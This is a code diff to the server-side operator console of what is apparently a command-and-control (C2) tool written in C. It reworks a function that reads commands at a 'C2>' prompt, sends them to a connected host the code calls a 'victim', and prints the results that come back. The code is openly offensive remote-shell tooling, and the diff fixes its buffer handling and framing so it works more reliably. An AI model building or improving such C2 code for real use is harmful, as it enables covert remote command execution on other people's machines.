@@ -1,38 +1,26 @@
+#include <stdlib.h>
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include "c2.h"
 #include "server/server_psh.h"
+#include "common.h"
 #include <string.h>
 
-void psh_send(char* buf, sock_t client_fd) {
+void psh_send(sock_t client_fd) {
+    char buf[C2_BUF_SIZE];
     while (1) {
         printf("\nC2> ");
         fflush(stdout);
-        if (!fgets(buf, sizeof(buf), stdin)) break;
+        if (!fgets(buf, C2_BUF_SIZE, stdin)) break;
         buf[strcspn(buf, "\n")] = 0;
-        if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) break;
 
-        send(client_fd, buf, strlen(buf), 0);
-        send(client_fd, "\n", 1, 0);
+        if (safe_send_payload(client_fd, buf, strlen(buf) + 1, 0) <= 0) break;
+
+        if (strcmp(buf, "quit") == 0) break;
         
-        while (1) {
-            // Receive up to buffer-1 bytes.
-            int n = recv(client_fd, buf, sizeof(buf)-1, 0); 
-            if (n <= 0) { 
-                printf("\n[!] Victim disconnected\n"); 
-                break; 
-            }
-            buf[n] = '\0';
-
-            // Check for EOF marker
-            char *eof_pos = strstr(buf, C2_EOF_MARK);
-            if (eof_pos) {
-                *eof_pos = '\0';
-                printf("%s", buf);
-                break;
-            }
-            printf("%s", buf);
-        }
+        char* cmd_output = (char*)safe_recv_payload(client_fd, NULL, 0);
+        if (cmd_output) printf("%s\n", cmd_output);
+        free(cmd_output);
     }
     return;
 }
